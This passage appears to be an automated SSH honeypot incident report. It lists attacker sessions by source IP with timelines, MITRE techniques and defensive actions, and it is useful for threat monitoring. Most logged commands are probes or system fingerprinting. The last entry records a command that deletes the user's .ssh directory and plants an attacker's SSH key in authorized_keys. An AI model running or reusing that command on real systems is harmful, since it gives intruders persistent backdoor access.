| `2026-07-05 04:03:56` | `cowrie.command.input` |
| `2026-07-05 04:03:56` | `cowrie.command.success` |
| `2026-07-05 04:03:56` | `cowrie.command.input` |
| `2026-07-05 04:03:56` | `cowrie.command.input` |
| `2026-07-05 04:03:56` | `cowrie.command.input` |
| `2026-07-05 04:03:56` | `cowrie.command.input` |
| `2026-07-05 04:03:58` | `cowrie.log.closed` |
| `2026-07-05 04:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede4d013bfa9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:05 |
| **Last Seen** | 2026-07-05 04:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:05:17` | `cowrie.session.connect` |
| `2026-07-05 04:05:18` | `cowrie.client.version` |
| `2026-07-05 04:05:18` | `cowrie.client.kex` |
| `2026-07-05 04:05:21` | `cowrie.login.success` |
| `2026-07-05 04:05:23` | `cowrie.session.params` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.command.success` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.command.input` |
| `2026-07-05 04:05:23` | `cowrie.log.closed` |
| `2026-07-05 04:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-431aeedb1f8d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 04:05 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:05:44` | `cowrie.session.connect` |
| `2026-07-05 04:05:47` | `cowrie.client.version` |
| `2026-07-05 04:05:47` | `cowrie.client.kex` |
| `2026-07-05 04:05:52` | `cowrie.login.success` |
| `2026-07-05 04:05:57` | `cowrie.session.params` |
| `2026-07-05 04:05:57` | `cowrie.command.input` |
| `2026-07-05 04:06:00` | `cowrie.log.closed` |
| `2026-07-05 04:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1e28842c80

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:05 |
| **Last Seen** | 2026-07-05 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:05:52` | `cowrie.session.connect` |
| `2026-07-05 04:05:52` | `cowrie.client.version` |
| `2026-07-05 04:05:52` | `cowrie.client.kex` |
| `2026-07-05 04:05:52` | `cowrie.login.success` |
| `2026-07-05 04:05:53` | `cowrie.session.params` |
| `2026-07-05 04:05:53` | `cowrie.command.input` |
| `2026-07-05 04:05:53` | `cowrie.log.closed` |
| `2026-07-05 04:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f28b264866

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:05 |
| **Last Seen** | 2026-07-05 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:05:53` | `cowrie.session.connect` |
| `2026-07-05 04:05:53` | `cowrie.client.version` |
| `2026-07-05 04:05:54` | `cowrie.client.kex` |
| `2026-07-05 04:05:54` | `cowrie.login.success` |
| `2026-07-05 04:05:55` | `cowrie.session.params` |
| `2026-07-05 04:05:55` | `cowrie.command.input` |
| `2026-07-05 04:05:55` | `cowrie.log.closed` |
| `2026-07-05 04:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e298b019138

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:05 |
| **Last Seen** | 2026-07-05 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:05:55` | `cowrie.session.connect` |
| `2026-07-05 04:05:55` | `cowrie.client.version` |
| `2026-07-05 04:05:55` | `cowrie.client.kex` |
| `2026-07-05 04:05:56` | `cowrie.login.success` |
| `2026-07-05 04:05:57` | `cowrie.session.params` |
| `2026-07-05 04:05:57` | `cowrie.command.input` |
| `2026-07-05 04:05:57` | `cowrie.log.closed` |
| `2026-07-05 04:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092212c09776

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:05 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:05:57` | `cowrie.session.connect` |
| `2026-07-05 04:05:57` | `cowrie.client.version` |
| `2026-07-05 04:05:57` | `cowrie.client.kex` |
| `2026-07-05 04:05:58` | `cowrie.login.success` |
| `2026-07-05 04:05:59` | `cowrie.session.params` |
| `2026-07-05 04:05:59` | `cowrie.command.input` |
| `2026-07-05 04:06:00` | `cowrie.log.closed` |
| `2026-07-05 04:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30586a0d844c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 04:05 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:05:58` | `cowrie.session.connect` |
| `2026-07-05 04:05:58` | `cowrie.client.version` |
| `2026-07-05 04:05:58` | `cowrie.client.kex` |
| `2026-07-05 04:05:58` | `cowrie.login.success` |
| `2026-07-05 04:06:00` | `cowrie.session.params` |
| `2026-07-05 04:06:00` | `cowrie.command.input` |
| `2026-07-05 04:06:00` | `cowrie.log.closed` |
| `2026-07-05 04:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-235d690f61a4

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:00` | `cowrie.session.connect` |
| `2026-07-05 04:06:00` | `cowrie.client.version` |
| `2026-07-05 04:06:00` | `cowrie.client.kex` |
| `2026-07-05 04:06:01` | `cowrie.login.success` |
| `2026-07-05 04:06:02` | `cowrie.session.params` |
| `2026-07-05 04:06:02` | `cowrie.command.input` |
| `2026-07-05 04:06:02` | `cowrie.log.closed` |
| `2026-07-05 04:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c1b36c6fde7

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:02` | `cowrie.session.connect` |
| `2026-07-05 04:06:02` | `cowrie.client.version` |
| `2026-07-05 04:06:02` | `cowrie.client.kex` |
| `2026-07-05 04:06:03` | `cowrie.login.success` |
| `2026-07-05 04:06:04` | `cowrie.session.params` |
| `2026-07-05 04:06:04` | `cowrie.command.input` |
| `2026-07-05 04:06:05` | `cowrie.log.closed` |
| `2026-07-05 04:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e302b65b5c98

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:05` | `cowrie.session.connect` |
| `2026-07-05 04:06:05` | `cowrie.client.version` |
| `2026-07-05 04:06:05` | `cowrie.client.kex` |
| `2026-07-05 04:06:05` | `cowrie.login.success` |
| `2026-07-05 04:06:06` | `cowrie.session.params` |
| `2026-07-05 04:06:06` | `cowrie.command.input` |
| `2026-07-05 04:06:06` | `cowrie.log.closed` |
| `2026-07-05 04:06:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad7394bb286

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:07` | `cowrie.session.connect` |
| `2026-07-05 04:06:07` | `cowrie.client.version` |
| `2026-07-05 04:06:07` | `cowrie.client.kex` |
| `2026-07-05 04:06:07` | `cowrie.login.success` |
| `2026-07-05 04:06:08` | `cowrie.session.params` |
| `2026-07-05 04:06:08` | `cowrie.command.input` |
| `2026-07-05 04:06:08` | `cowrie.log.closed` |
| `2026-07-05 04:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c4b2897524

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:08` | `cowrie.session.connect` |
| `2026-07-05 04:06:09` | `cowrie.client.version` |
| `2026-07-05 04:06:09` | `cowrie.client.kex` |
| `2026-07-05 04:06:09` | `cowrie.login.success` |
| `2026-07-05 04:06:10` | `cowrie.session.params` |
| `2026-07-05 04:06:10` | `cowrie.command.input` |
| `2026-07-05 04:06:11` | `cowrie.log.closed` |
| `2026-07-05 04:06:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313383337b38

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:11` | `cowrie.session.connect` |
| `2026-07-05 04:06:11` | `cowrie.client.version` |
| `2026-07-05 04:06:11` | `cowrie.client.kex` |
| `2026-07-05 04:06:11` | `cowrie.login.success` |
| `2026-07-05 04:06:12` | `cowrie.session.params` |
| `2026-07-05 04:06:12` | `cowrie.command.input` |
| `2026-07-05 04:06:12` | `cowrie.log.closed` |
| `2026-07-05 04:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f4252d3e762

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:12` | `cowrie.session.connect` |
| `2026-07-05 04:06:12` | `cowrie.client.version` |
| `2026-07-05 04:06:13` | `cowrie.client.kex` |
| `2026-07-05 04:06:13` | `cowrie.login.success` |
| `2026-07-05 04:06:14` | `cowrie.session.params` |
| `2026-07-05 04:06:14` | `cowrie.command.input` |
| `2026-07-05 04:06:14` | `cowrie.log.closed` |
| `2026-07-05 04:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a67abc377b3

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:14` | `cowrie.session.connect` |
| `2026-07-05 04:06:14` | `cowrie.client.version` |
| `2026-07-05 04:06:15` | `cowrie.client.kex` |
| `2026-07-05 04:06:15` | `cowrie.login.success` |
| `2026-07-05 04:06:16` | `cowrie.session.params` |
| `2026-07-05 04:06:16` | `cowrie.command.input` |
| `2026-07-05 04:06:16` | `cowrie.log.closed` |
| `2026-07-05 04:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e797d836af5

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:17` | `cowrie.session.connect` |
| `2026-07-05 04:06:17` | `cowrie.client.version` |
| `2026-07-05 04:06:17` | `cowrie.client.kex` |
| `2026-07-05 04:06:17` | `cowrie.login.success` |
| `2026-07-05 04:06:18` | `cowrie.session.params` |
| `2026-07-05 04:06:18` | `cowrie.command.input` |
| `2026-07-05 04:06:18` | `cowrie.log.closed` |
| `2026-07-05 04:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19469f26712c

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:18` | `cowrie.session.connect` |
| `2026-07-05 04:06:19` | `cowrie.client.version` |
| `2026-07-05 04:06:19` | `cowrie.client.kex` |
| `2026-07-05 04:06:19` | `cowrie.login.success` |
| `2026-07-05 04:06:20` | `cowrie.session.params` |
| `2026-07-05 04:06:20` | `cowrie.command.input` |
| `2026-07-05 04:06:20` | `cowrie.log.closed` |
| `2026-07-05 04:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc434ab4af8

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:20` | `cowrie.session.connect` |
| `2026-07-05 04:06:20` | `cowrie.client.version` |
| `2026-07-05 04:06:20` | `cowrie.client.kex` |
| `2026-07-05 04:06:21` | `cowrie.login.success` |
| `2026-07-05 04:06:22` | `cowrie.session.params` |
| `2026-07-05 04:06:22` | `cowrie.command.input` |
| `2026-07-05 04:06:22` | `cowrie.log.closed` |
| `2026-07-05 04:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc282857cbc

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:23` | `cowrie.session.connect` |
| `2026-07-05 04:06:23` | `cowrie.client.version` |
| `2026-07-05 04:06:23` | `cowrie.client.kex` |
| `2026-07-05 04:06:24` | `cowrie.login.success` |
| `2026-07-05 04:06:25` | `cowrie.session.params` |
| `2026-07-05 04:06:25` | `cowrie.command.input` |
| `2026-07-05 04:06:25` | `cowrie.log.closed` |
| `2026-07-05 04:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1510868865b

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:25` | `cowrie.session.connect` |
| `2026-07-05 04:06:25` | `cowrie.client.version` |
| `2026-07-05 04:06:25` | `cowrie.client.kex` |
| `2026-07-05 04:06:25` | `cowrie.login.success` |
| `2026-07-05 04:06:26` | `cowrie.session.params` |
| `2026-07-05 04:06:26` | `cowrie.command.input` |
| `2026-07-05 04:06:26` | `cowrie.log.closed` |
| `2026-07-05 04:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31dd50a53277

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:27` | `cowrie.session.connect` |
| `2026-07-05 04:06:27` | `cowrie.client.version` |
| `2026-07-05 04:06:27` | `cowrie.client.kex` |
| `2026-07-05 04:06:27` | `cowrie.login.success` |
| `2026-07-05 04:06:28` | `cowrie.session.params` |
| `2026-07-05 04:06:28` | `cowrie.command.input` |
| `2026-07-05 04:06:28` | `cowrie.log.closed` |
| `2026-07-05 04:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-151e586ce6d1

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:29` | `cowrie.session.connect` |
| `2026-07-05 04:06:29` | `cowrie.client.version` |
| `2026-07-05 04:06:29` | `cowrie.client.kex` |
| `2026-07-05 04:06:29` | `cowrie.login.success` |
| `2026-07-05 04:06:31` | `cowrie.session.params` |
| `2026-07-05 04:06:31` | `cowrie.command.input` |
| `2026-07-05 04:06:31` | `cowrie.log.closed` |
| `2026-07-05 04:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-239239850fee

| Field | Detail |
|---|---|
| **Source IP** | `2.26.0[.]248` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:31` | `cowrie.session.connect` |
| `2026-07-05 04:06:31` | `cowrie.client.version` |
| `2026-07-05 04:06:31` | `cowrie.client.kex` |
| `2026-07-05 04:06:32` | `cowrie.login.success` |
| `2026-07-05 04:06:33` | `cowrie.session.params` |
| `2026-07-05 04:06:33` | `cowrie.command.input` |
| `2026-07-05 04:06:33` | `cowrie.log.closed` |
| `2026-07-05 04:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.0[.]248` to AbuseIPDB if not already reported
- [ ] Block `2.26.0[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6710309eb17

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
